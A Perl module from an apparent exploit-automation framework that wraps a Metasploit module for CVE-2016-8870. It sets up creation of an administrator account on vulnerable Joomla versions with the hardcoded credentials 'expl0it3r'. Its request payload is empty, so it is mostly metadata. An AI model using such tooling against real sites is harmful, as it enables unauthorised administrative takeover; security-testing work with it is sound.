package JOOMLA::MSF::JoomlaRegistrationPrivesc;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "JoomlaRegistrationPrivesc";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2016-8870",
  "DESCRIPTION" => "

        This module creates an arbitrary account with administrative privileges in Joomla versions 3.4.4

        through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).

      ",
  "MSF_MODULE" => "joomla_registration_privesc",
  "PASSWORD FOR THE USERTITLE" => "expl0it3r",
  "PATHS" => [""],
  "REFERENCES" => [
    "https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html",
    "https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html",
    "https://medium.com/\@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2",
  ],
  "TITLE" => "Joomla Account Creation and Privilege Escalation",
  "USERTITLE THAT WILL BE CREATED" => "expl0it3r",
  VARIABLES => {
    'EMAIL' =>       {
  DESCRIPTION => "Email to receive the activation code for the account",
  VALUE => "example\@youremail.com",
},
    'PATH' =>       {
  DESCRIPTION => "The relative URI of the Joomla instance",
  VALUE => "/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
